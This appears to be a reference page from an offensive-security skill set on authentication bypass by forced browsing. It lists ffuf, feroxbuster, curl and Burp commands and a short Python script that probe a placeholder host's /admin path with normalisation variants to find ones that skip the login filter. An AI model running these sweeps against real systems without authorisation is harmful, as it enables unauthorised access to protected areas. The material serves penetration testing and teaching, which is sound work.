# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`authentication-bypass-forced-browsing`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `ffuf` | `ffuf -w paths.txt -u https://target.example/FUZZ -mc 200,403 -fc 404` | Enumerate protected paths and normalisation variants and filter out plain 404s | Cross-platform |
| `curl` | `curl -s -o /dev/null -w '%{http_code}' https://target.example/admin/.` | Compare the status of a normalisation variant against the canonical protected path | Cross-platform |
| `feroxbuster` | `feroxbuster -u https://target.example -w paths.txt --extract-links` | Discover alternate entry points and aliases that reach gated content | Cross-platform |
| `Burp Suite Repeater` | `Toggle trailing slash, case, and %2e variants on the protected path` | Observe which single variant skips the authentication filter | Cross-platform |

## Minimal Script Shape

A variant sweep: it requests the canonical protected path and a set of normalisation variants unauthenticated, then reports any variant that returns content the canonical path withholds.

```python
import urllib.error
import urllib.request

BASE = "https://target.example"
VARIANTS = ["/admin", "/admin/", "/Admin", "/admin/.", "/admin%2f", "/./admin"]

def status(path):
    req = urllib.request.Request(BASE + path)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status
    except urllib.error.HTTPError as exc:
        return exc.code

baseline = status("/admin")
rows = {variant: status(variant) for variant in VARIANTS}
bypassed = [v for v, code in rows.items() if code == 200 and baseline in (301, 302, 401, 403)]
print({"canonical": baseline, "variants": rows, "filter_bypassed": bypassed})
```
